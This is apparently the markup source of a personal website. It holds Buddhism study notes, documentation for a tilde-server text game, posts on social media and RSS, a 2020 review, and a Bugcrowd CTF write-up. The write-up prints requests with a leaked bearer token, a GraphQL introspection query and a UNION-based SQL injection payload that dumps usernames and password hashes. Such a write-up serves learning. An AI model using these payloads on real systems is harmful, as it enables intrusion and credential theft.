1 Buddhism
& These are my notes from studying and practicing [b:secular Buddhism]. Most of this was gathered while reading [l:https://www.amazon.com/dp/B07C31XJGP|No-Nonsense Buddhism for Beginners] by Noah Rasheta.
# [l:#The Four Noble Truths|The Four Noble Truths]
# [l:#The Eightfold Path|The Eightfold Path]
# [l:#The Five Aggregates|The Five Aggregates]
# [l:#The Five Precepts|The Five Precepts]

2 The Four Noble Truths
# [l:#Truth of Suffering|Truth of Suffering]
# [l:#Truth of the Cause of Suffering|Truth of the Cause of Suffering]
# [l:#Truth of the End of Suffering|Truth of the End of Suffering]
# [l:#Truth of the Path That Leads to the End of Suffering|Truth of the Path That Leads to the End of Suffering]
3 Truth of Suffering
& Difficulties arise and we suffer.
& Examples include sickness, old age, death, losing a job, and breaking your phone.
& Accept that suffering is part of life for everyone. There is no way around it.
3 Truth of Cause of Suffering
& The main cause of suffering is habitual reactivity.
& Suffering emerges when we want life to be different than it is.
& Our reaction causes the suffering, not the thing itself.
3 Truth of the End of Suffering
& The cessation of suffering.
& The suffering doesn't cease, but rather our craving not to suffer does.
3 Truth of the Path That Leads to the End of Suffering
& The Eightfold Path.
& The path of liberation.
& The path to the cessation of suffering.
2 The Eightfold Path
& Ways to live that lead to the end of suffering.
& There are three sections that the various points of the Eightfold Path are grouped under:
- 1-2 [b:Wisdom] (understanding, intent)
- 3-5 [b:Ethical Conduct] (speech, action, livelihood)
- 6-8 [b:Mental Discipline] (effort, mindfulness, concentration)
# [l:#Right Understanding|Right Understanding]
# [l:#Right Intent|Right Intent]
# [l:#Right Speech|Right Speech]
# [l:#Right Action|Right Action]
# [l:#Right Livelihood|Right Livelihood]
# [l:#Right Effort|Right Effort]
# [l:#Right Mindfulness|Right Mindfulness]
# [l:#Right Concentration|Right Concentration]
3 Right Understanding
& What we are seeing might not actually be what it appears to be.
& Uncertain concepts and ideas that prevent us from seeing reality as it is.
3 Right Intent
& Be aware of our intentions regarding the things we say and do.
& Intentions from anger or hatred are more likely to cause harm than intentions from happiness and gratitude.
& Behaving reactively makes it difficult to be mindful of our intentions.
3 Right Speech
& Communicating with others in a way that doesn't cause harm.
& Lying, gossiping, or insulting are not right speech.
& With right speech, you consider why you say something as much as what you say.
3 Right Action
& Doing what is proper and necessary for your situation.
& While this sometimes includes "doing the right thing" morally, it more closely resembles behaving appropriately in any situation.
3 Right Livelihood
& Livelihood is how we make a living and how we interact with others on the job.
& We need to determine if what we do is doing more harm or good for ourselves and others.
3 Right Effort
& What it takes to put into practice the other parts of the path.
& It takes effort if we want any kind of positive change in our lives.
3 Right Mindfulness
& Paying attention at all times.
& Being mindful helps us stay anchored in the present moment, which keeps us in touch with reality as it is.
3 Right Concentration
& The practice of focusing on only one thing, whatever it is we are doing.
& The opposite is distraction.
2 The Five Aggregates
& Suffering arrises when one identifies with or clings to one of the aggregates.
# [l:#Form or Materiality|Form or Materiality]
# [l:#Sensation or Feeling Tone|Sensation or Feeling Tone]
# [l:#Perception|Perception]
# [l:#Mental Formation or Thought Process|Mental Formation or Thought Process]
# [l:#Consciousness or Awareness|Consciousness or Awareness]
3 Form or Materiality
& Something material that can be sensed with sight, sound, taste or touch.
3 Sensation or Feeling Tone
& The feeling state that arises when we sense something pleasant or unpleasant.
& Feeling tones can be understood as pleasure, pain, or neutrality.
3 Perception
& Recognition of a sensation we have experienced.
& Perception is giving names to something, like "scary".
3 Mental Formation or Thought Process
& Likes, dislikes, biases, and prejudices.
& Mental formations alter perception.
3 Consciousness or Awareness
& General awareness of other aggregates that make the entire experience possible.
2 The Five Precepts
& There are no moral absolutes in Buddhism, so the precepts are left to interpretation.
& These are general rules of things that are best to abstain from.
# [l:#Abstain From Taking Life|Abstain From Taking Life]
# [l:#Abstain From Taking What is Not Given|Abstain From Taking What is Not Given]
# [l:#Abstain From Sexual Misconduct|Abstain From Sexual Misconduct]
# [l:#Abstain From Incorrect Speech|Abstain From Incorrect Speech]
# [l:#Abstain From Intoxicants That Cloud The Mind|Abstain From Intoxicants That Cloud The Mind]
3 Abstain From Taking Life
& Could relate to abortion, death penalty, or killing insects.
& In order to weigh consequences of our actions, it's helpful to examine if it's motivated by greed, hatred, and delusion, or by kindness, wisdom, and compassion.
& Intent plays a key role.
3 Abstain From Taking What is Not Given
& Goes beyond stealing and includes evaluating your motivations and understanding how your actions will affect others.
3 Abstain From Sexual Misconduct
& What is considered misconduct is determined by the inherited culture and societal views.
& Non-consensual sex and sexual exploitation are misconduct.
& Examine how your actions make you feel and how it will impact others.
3 Abstain From Incorrect Speech
& Goes beyond not telling lies.
& It means speaking honestly and communicating in a way that is beneficial to others.
& Incorrect speech is rooted in the three poisons of greed, hatred, and ignorance.
& Misleading others, saying intentionally hurtful things, and gossiping are incorrect speech.
3 Abstain From Intoxicants That Cloud The Mind
& Could be alcohol, drugs, or anything that clouds the mind, or alters perception.
& Media we consume or addictive habits.
& Be cautious of distractions from reality.
2 The Three Marks of Existence
# [l:#Suffering|Suffering]
# [l:#Impermanence|Impermanence]
# [l:#Non-self|Non-self]
3 Suffering
& There are 3 types of suffering
# [b:Suffering of Suffering]<br> Natural suffering like pain.
# [b:Suffering of Loss]<br> Lose a job, a loved one, our youth. Circumstantial.
# [b:All-pervasive Suffering]<br> Self-inflicted. Arises out of an ignorant or delusional understanding of reality. Has to do with how we perceive and interpret circumstances. We self-inflict based on a belief or concept. If we didn't hold the false belief, the suffering wouldn't exist.
3 Impermanence
& All things are constantly changing. Jobs, relationships, thoughts, feelings, loved ones, ourselves, everything we know and perceive will pass out of existence.
& We know this, but we cling to things and perceive them as permanent.
& Two types of impermanence - gross and subtle.
# [b:Gross]<br> Matter decays, empires rise and fall, societal norms change and evolve.
# [b:Subtle]<br> Moment-to-moment, cells in your body die and regenerate, you are never exactly the same. We are collections of impermanent, momentary experiences.
& Loss is a natural part of life, not something we need to fight against.
3 Non-self
& You are not what you think you are, because there is no inherent essence in anything.
& Things are because of, and in relation to, other things, but do not exist on their own as permanent or separate entities.
& Everything has causes and conditions, nothing stands alone.
& There is no permanent or fixed you, just a complex web of inseparable, impermanent, causes and effects.
2 The Three Poisons
# Greed
# Hatred
# Ignorance

~projects/tilde-world : Tilde world : A tilde server text game : 2021-03-03
1 Tilde world
& Tilde world (~world) is a flat-file, community powered, text adventure game intended to be run on tilde servers.
& [b:Source code:] [l:https://github.com/0xdstn/tilde-world]

# [l:#Props and actions|Props and actions]
# [l:#Action instructions|Action instructions]
# [l:#Game commands|Game commands]
# [l:#Future plans|Future plans]
# [l:#Release notes|Release notes]
2 Description
& Tilde world can be run on tilde.town by running [b:~dustin/projects/tilde-world/world.py]. When you first run it it will welcome you and ask your character's name and description.
& When you finish the setup it will create a [b:~/.world] directory with some configuration files and a [b:rooms] directory where you can create your own rooms (see below).
& Your name and description is saved in [b:~/.world/config].
& When the game is looking for a room at a coordinate, it will loop through all of the users on the server and check for that coordinate in their [b:.world/rooms] directory. The first one found is used, if there are duplicates (try not to step on each other's toes please).
& Your current position is saved in [b:~/.world/loc] in the format [b:x,y].
& Your inventory is saved in [b:~/.world/inventory]. Each item goes on one line in the format [b:key : x,y]. The x,y is the room the object came from so we can reference it's data again.
& The state for props are saved in `~/.world/state`. It saves in the format [b:object_prop.txt]. As props change via user interaction, these files are updated. They are created upon entering a room with an object that has a prop.
2 Creating rooms
& You can create your own rooms by placing files in the [b:~/.world/rooms] directory.
& The files are named for their coordinates in the format [b:x_y]. Negative coordinates use an "n" instead of "-". So a room at coordinate [b:-1 0] would be a file named [b:n1_0].
& A basic room looks like this:
% NAME : Landing room
% DESC : An ordinary room
& Rooms have the following properties available:
- [c:NAME] - The name of the room
- [c:DESC] - A description of the room. This is displayed with the [b:look] command
- [c:KEY] - Optional. An ID and name of an item required to enter this room from any direction in this format: [b:west-key|West room key]
- [c:TELEPORT] - Optional. x,y coordinates to redirect the user to if they teleport here (such as the start of a dungeon).
2 Objects
& A room can contain multiple objects. A room with objects would look like this:
% NAME : Landing room
% DESC : An ordinary room
% OBJECTS
%   -
%    ID : sword
%    NAME : wooden sword
%    GRAB : true
%    DESC : A wooden sword in good condition
%  -
%    ID : shield
%    NAME : wooden shield
%    GRAB : true
%    DESC : A wooden shield in good condition
& Objects have the following properties available:
- [c:ID] - A unique identifier for referencing the object
- [c:NAME] - The name of the object
- [c:DESC] - A description of the object displayed with [b:look obj_id]. You can reference props with [propkey], and they will automatically be replaced with the value of the prop
- [c:GRAB] - (Optional, default false) [b:true] or [b:false], if the item can be picked up by a user
- [c:HIDDEN] - (Optional, default false) [b:true] or [b:false], if the item is listed in the room with the [b:look] command
- [c:ACTIONS] - (Optional) A list of actions, see below
- [c:PROPS] - (optional) A list of props, see below
2 Props and actions
& Objects can have props and actions.
& Props are key/value pairs. They will be stored in a file specific to the room/prop and the user. That means that whatever state a room and it's objects are in for one user does not affect it for another user.
& Actions are a list of triggers and a list of instructions.
& Here is an object with a prop and an action:
%   -
%    ID : lamp
%    NAME : ordinary lamp
%    GRAB : false
%    DESC : A lamp with a switch. It is currently [power].
%    PROPS
%      power=off
%    ACTIONS
%      turn|switch|push|pull
%        IF power=on
%        SET power=off
%        ECHO You turn off the lamp
%        ELSE
%        SET power=on
%        ECHO You turn on the lamp
%        ENDIF
& When the user runs [b:turn lamp] it will either turn the power prop on or off depending on if it is currently set to on or off.
2 Action instructions
& Actions currently support the following:
- [c:IF (prop)=(value)] - If prop of the item is the provided value, all following instructions until an [b:ELSE] or [b:ENDIF] will be run
- [c:IF INVENTORY=(item1,item2)] - If the inventory contains the provided item(s), all following instructions until an [b:ELSE] or [b:ENDIF] will be run
- [c:ELSE] - Placed between an [b:IF] and [b:ENDIF]. If the IF statement is false, all following instructions until an [b:ENDIF] will be run
- [c:ECHO (message)] - Prints out the provided message. Props will be replaced with their value in the format [prop]
- [c:GRAB (object)] - Adds the provided object key to the inventory (must also be in the same room, hidden or not)
- [c:TELEPORT (x) (y)] - Teleports to provided x,y coordinates
- [c:PROMPT (prop)|(message)] - Prompts the user with the message. Their input is stored in the provided prop
2 Game commands
& As a user of the game you can run the following commands:
- [c:look] - View the room along with it's objects and exits
- [c:look (object)] - View the provided object and it's actions
- [c:grab (object)] - Add the provided object to the inventory
- [c:drop (object)] - Remove the provided object from the inventory
- [c:(action) (object)] - Runs the provided action on the provided object
- [c:inventory] - List the inventory
- [c:go (direction)] - Go the provided direction (north,south,east,west)
- [c:teleport (x) (y)] - Go to the provided coordinates
- [c:quit] - Quit ~world
- [c:help] - Displays the help menu
- [c:about] - Displays information about the author and project

1 RSS Feed
_ 2021.04.22
& I wrote in my [l:writing/social|thoughts on social media] how I am now using RSS feeds to keep up on the work of people I want to follow, and that if they do not have an RSS feed, I won't be keeping up on them, and that's fine.
& This was somewhat ironic considering I didn't have an RSS feed of my own.
& I have now added an [l:index.xml|RSS feed] that gets generated with my custom python script that creates the site. It will now update every time I publish something new. It was fun figuring out how to craft the XML for a feed.

~writing/withdrawal : Social Media Withdrawal : Stream of thought during a social media withdrawal : 2021-04-15
1 Social Media Withdrawal
_ 2021.04.15
& I'm already feeling social media withdrawal. It's only been a couple weeks, if that. I'm used to scrolling through Instagram and Mastodon.
& It feels like I'm missing out. That I could be interacting with like-minded people and I'm not.
& The silly thing is I normally don't really interact with people on social media, I just browse, giving me that hit of dopamine my body is craving.
& Instead of going and making an account somewhere, I'm writing here. Maybe nobody will read this, maybe someone will, who knows. This is more for me.
& I want to spend time writing, thinking, and creating, not scrolling mindlessly.
& I often feel like I'm missing out on information. There are [i:things] out there being created that I'm not seeing. The truth is I hardly see anything that I couldn't have lived without.
& I will probably go read some things from my RSS feeds. That should help. This seems to have helped too.

~writing/social : On Social Media : Thoughts on the dangers of social media : 2021-04-13
1 On Social Media
_ 2021.04.13
& I've had a complicated relationship with social media over the years. In the early days, I was actively trying to get an account on [i:every] platform I could find. I loved having a list of every service I had an account for on my personal website. After years of trying to keep up with everything, I'm now moving in the opposite direction.
& Social media has gotten worse and worse over the last decade, as far as mental impact goes. It's exhasting for most people. We weren't meant to keep up with so much information all of the time. It's just too much for our brains to manage.
& For me, even simpler, less exhausting social media doesn't do me good. I ditched Twitter and various other big social networks a long time ago, and started using smaller communities through Mastodon.
& Now that I was consuming a manageable amount of information, and mostly positive at that, I uncovered my new issue.
& I am easily swayed by the things I consume. If I'm reading posts about things people are doing, I will become obsessed with whatever topic that is for a while, until something new shifts my focus. This means that every day I could be getting pulled in a new direction, which is time consuming and exhausting.
& Because of all of my failed attempts at using Mastodon and other social media, I'm now shying away from it all. I've deleted my Mastodon account and will not make another one (I've had a lot of accounts on various instances over the years).
& My choice now is to organically find things that pique my interest. This is a lot more manageable and less likely to cause me to switch what I'm doing constantly.
& I will be writing my thoughts and documenting my projects on this site, and that will be it. If someone wants to contact me, they can use my [l:mailto:0xdstn@protonmail.com|email]. There is no other way to send me a message. I imagine this will cause me to get nearly nobody reaching out to me, and that's okay. If someone finds it worth their time to click my email link and write something to me, that means to me that they really care about that communication. It will be a nice gesture if it happens, and it will not be missed if it does not.
& I am also choosing to follow some people who's work I like and want to keep up on via an RSS reader. If someone doesn't have a feed, I won't have a way to follow what they're doing, and that's okay.
& I will be using an offline RSS reader on my personal laptop, so I can't be tempted to refresh it over and over via my phone or my work computer. I only want to look at my feed when I'm  devoting uninterupted time to it.
& As per my [l:wiki/philosophy/#Technology|personal philosphy regarding technology] I will be using the internet [i:intentionally].
& If you are out there reading this and would like to say hi, I'm always available via [l:mailto:0xdstn@protonmail.com|email]. I'd be glad to discuss any shared interest we may have :)

~writing/2020 : 2020 Review : A retrospect of the year 2020 : 2020-12-31
1 2020 Review
_ 2020.12.31
& As we all know, this has been a crazy year. I figured I'd write down some reflections on it as we move into 2021.
# [l:#Challenges|Challenges]
# [l:#Personal growth|Personal growth]
# [l:#Gratitude|Gratitude]
# [l:#Changes|Changes]
# [l:#Reading|Reading]
# [l:#2021|2021]
2 Challenges
& Aside from the [b:COVID-19 pandemic], I faced additional challenges that I was not prepared for. In January, we ended up unexpectedly taking in two more children, bringing our total up to four. It was intended to be a temporary thing, 90 days max. They are still with us today, with no real end in sight.
& Learning to parent children you didn't bring into this world, coming in with their own issues and traumas is challenging. This has tested me as a parent like nothing else. I never realized how much more difficult it could be.
& On top of that, we all ended up doing school and work at home for a long time. I'm still working from home since March, and in-person schooling just started back up. You really grow together and simultaneously clash in an environemnt like this. It takes some getting used to, but it lends itself to much personal growth.
2 Personal growth
& Due to the unique challenges I've faced this year, I feel I have made a ton of personal growth. I was forced into situations that made it necessary to look inward, and learn.
& Since summer, I have been doing counselling, which I avoided for years, always using some excuse. This was one of the best decisions I have ever made. It has really allowed me to learn about myself, work on myself, and be more self aware.
& Through all of this, I have become closer to my wife than we have ever been, and I feel like I'm learning to be a better parent (though I have a lot more to learn).
& Even with all of the difficulties, I feel happier with myself than I've felt in a long time.
2 Gratitude
& It may be odd, but I am grateful for the pandemic. It pushed me to be a better version of myself. I had no choice but to grow, or it would have been incredibly more difficult.
& I am also very grateful that it did not impact my job, as it has for so many. I can continue working from home, and I don't have to worry about our financial state.
& I'm grateful for my wife for pushing me to seek help in the form of counselling. Without her encouragement, I wouldn't be who I am today. Who I am today is not who I was at the beginning of the year.
2 Changes
& I made some changes in my life this year, primarily rules I put on myself, allowing me to be less stressed and overall better.
- Self imposed [b:digital minimalism] restrictions
- Utilizing the [b:Love and Logic] parenting style
- Learned a lot of about [b:diversity and inclusion], and becoming aware of my own privilege
- Started [b:self reflecting] in my bullet journal
2 Reading
& I set out with a goal of reading 15 books this year, and I ended up reading 38. That was highly unexpected for myself.
& Even if you don't include the comics or very short books, I still surpassed my goal. I'm proud of myself for this, as I never used to be much of a reader prior to 2019.
& My goal for next year is going to be 20 books, as I'll probably read more normal length books.
& I want to primarily focus on nature and philosphy books, with a few fiction books here and there.
& While I've set this goal, I'm also going to try to not obsess over the number, as I've done that before. If I don't hit it, or I surpass it, what really matters is what I get out of the books.
& My favorite books this year were:
- [l:https://www.amazon.com/dp/B000FC1JAI|Meditations] by Marcus Aurelius, Gregory Hays
- [l:https://www.amazon.com/dp/B07DBRBP7G|Digital Minimalism] by Cal Newport
- [l:https://www.amazon.com/dp/B00IV351R0|Parenting With Love and Logic] by Foster Cline, Jim Fay
- [l:https://www.amazon.com/dp/B07MPYX96Y|Better Allies] by Karen Catlin
- [l:https://www.amazon.com/dp/B08DFHBWKV|No Longer Human] by Osamu Dazai
- [l:https://www.gutenberg.org/ebooks/520|The Life and Adventures of Santa Claus] by L. Frank Baum
2 2021
& Moving into [b:2021] I'd like to work on the following:
- Create a solid [b:morning routine] 
- Start and stick to a [b:daily meditation] habit
- [b:Write/reflect] nearly every day
- Be [b:less strict] with myself and others
- Take the time to [b:paint/sketch] more
- Use my [b:phone] for [b:less than an hour a day]

1 2020 Bugcrowd Graphiqal CTF Write-up
_ 2020.07.21
* [c:UPDATE 2021.04.13] It seems Bugcrowd has taken down this CTF, so the links will not work any longer. I will leave them as they were, as I don't have anything better to change them to.
& I have been interested in [b:appsec] for a long time, but never really took the time to study it or to practice it. I have recently started focusing my time on it, and decided to try my hand at [l:https://bugcrowd.com|Bugcrowd]'s beginner CTF, [l:https://bgcd.co/GRAPHIQALCTF|Graphiqal].

# [l:#Flag #3|Flag #3]
# [l:#Takeaways|Takeaways]
2 Scoping out the landscape
& The first thing I did was manually scope out the site, to see what was there. I found the following:
- [b:API (/api)] - displays a message saying they moved to [b:graphql]
- [b:Gogs (:3000)] - a [b:gogs] instance with some source code
2 Flag #1
& I manually browsed the source code in the repository, as there wasn't much. Eventually I found [l:http://164.90.156.83:3000/maxim/graphiqal-ant/commit/be4aa476e3241298408fa48d1b8216bd2c5b3fc4|this commit] which contained the first flag: [c:FLAG{9e233d7662f4fe8f0e6eaee08b1e1dd8}].
& In hindsight I realized a more efficient use of my time would have been to download each of the repositories and run [c:ack "FLAG"] which also would have given me this flag.
2 Flag #2
& After finding that one fairly quickly I decided to take a look at [b:graphql] since it was mentioned on the [b:/api] page.
& A common endpoint for graphql is [c:/graphql]. I made a request to that and received the following response:
% $ http http://164.90.156.83/graphql
% HTTP/1.1 401 Unauthorized
% 
% Missing Bearer Token
& Since I needed a bearer token, I decided to search through the repositories again to see if I could find a secret I could use to generate a token. I then stumbled upon a [l:http://164.90.156.83:3000/maxim/new-painting-checker/src/master/retrieve.py|cleartext token]. Even better.
& I made a request, passing the token as a header and got a response letting me know it worked:
% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d"
% HTTP/1.1 400 Bad Request
% 
% {
%   "errors": [
%     {
%         "message": "Must provide query string."
%     }
%   ]
% }
& Since I was now able to make graphql requests, I searched for a query that I could use to get a list of all the available graphtypes. I found [l:https://stackoverflow.com/questions/37397886/get-graphql-whole-schema-query|this stackoverflow question] which provided an introspection query to get the schema information. After some trial and error I ended up with this request:
% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {__schema{queryType{name}types{name fields(includeDeprecated: true) { name description isDeprecated deprecationReason }}}}"

%                             "description": null,
%                             "isDeprecated": false,
%                             "name": "genre"
%                         },
%                         {
%                             "deprecationReason": null,
%                             "description": null,
%                             "isDeprecated": false,
%                             "name": "price"
%                         }
%                     ],
%                     "name": "Paintings"
%                 },

%           ]
%           ...
%         }
%     }
% }
& It seemed the only graphtype I could use was [b:Paintings] so I made a request to fetch all of those:
% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {paintings{id name genre artist price}}"

% }
& And there we have it, flag #2: [c:FLAG{b5c009704caf8d0575cbc801a97ae49b}]
2 Flag #3
& This one gave me a lot of troubles. I didn't know where to start, as I had exhausted all of the ideas I had from my initial investigation of the landscape. I poked around more in the repositories trying to find any sort of credentials I could use. There were some local SQL credentials, however port 3306 was not open on the server.
& I had no idea how much more difficult this flag would be, and ended up going down the wrong path. I had decided there may be a documented vulnerability with the version of gogs they were running. I tried many different POCs for vulnerabilities related to gogs, all with no luck. I even tried using a script called [l:https://github.com/TheZ3ro/gogsownz|gogsownz]. Nothing was working.
& I was certain I was on the right track, because there was a reference to a file in the repo: [c:/tmp/testing/pwned777.txt], I figured I needed to use a [b:Path Traversal] attack to find out what was in that file.
& After a lot of effort I went into the [l:https://discord.com/invite/TWr3Brs|Bugcrowd Discord] and asked how much more difficult the third flag was from the second. While looking in there I also noticed someone said there wasn't any vulnerable software, as far as they knew, so that would indicate that this was the wrong path to be going down.
& There was then a hint posted
> [b:mqt:] think of from where the API is pulling the data and what vulnerabilities can arise from this
& I was then thinking about how I saw those SQL credentials, and how graphql would use some sort of database technology. I then started researching how to do [b:SQL Injection] via [b:graphql] queries. It turned out that I could use the [b:painting] request where you pass an ID to get a single painting, and inject some SQL into it. This ended up working, and after some playing around I came up with this query:
% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {painting(id:\"' UNION SELECT id, GROUP_CONCAT(password),GROUP_CONCAT(username),null,null FROM users #\"){id name artist}}"
% HTTP/1.1 200 OK
% 
% {
%     "data": {
%         "painting": {
%             "artist": "maxim,hadi,FLAG",
%             "id": "1",
%             "name": "29d79648ac14a5d8d0268867bd3161c6,bc8a5e6ccfb6c15b61d6d218c2df6cca,FLAG{2f55138f7dce2e3e852f1c8a487b33f9}"
%         }
%     }
% }
& There it was, the third flag as a password of the user FLAG: [c:FLAG{2f55138f7dce2e3e852f1c8a487b33f9]
2 Takeaways
& This CTF provided multiple attack vectors that should be considered when writing software:
3 Flag 1
- Don't leave sensitive information in git repositories
3 Flag 2
- Don't leave secrets or tokens in git repositories
- Don't allow introspection queries in graphql
3 Flag 3
- Sanitize your inputs to prevent SQL injection
2 Final notes
& While I started going in the wrong direction, and I ended up using a hint, overall I consider this a success and I had a ton of fun participating. I'm going to continue to try my hand at other challenges. Thanks for reading!
